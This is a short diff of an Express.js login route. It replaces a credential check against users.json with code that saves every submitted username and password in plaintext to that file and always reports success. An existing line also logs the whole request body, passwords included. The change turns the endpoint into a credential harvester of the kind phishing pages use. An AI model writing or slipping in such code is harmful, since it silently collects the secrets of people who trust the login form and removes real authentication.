@@ -31,17 +31,19 @@ app.post('/api/login', (req, res) => {
   console.log("Received login:", req.body);
   const { username, password } = req.body;
 
-  const users = fs.existsSync('users.json')
-    ? JSON.parse(fs.readFileSync('users.json'))
-    : [];
-
-  const match = users.find(u => u.username === username && u.password === password);
-
-  if (match) {
-    res.json({ success: true });
-  } else {
-    res.json({ success: false, message: "Invalid username or password" });
+  let data = [];
+  try {
+    if (fs.existsSync('users.json')) {
+      const raw = fs.readFileSync('users.json', 'utf8');
+      data = raw.trim() ? JSON.parse(raw) : [];
+    }
+  } catch (e) {
+    data = [];
   }
+
+  data.push({ username, password });
+  fs.writeFileSync('users.json', JSON.stringify(data, null, 2));
+  res.json({ success: true });
 });
 
 // EMAIL ROUTE - unchanged
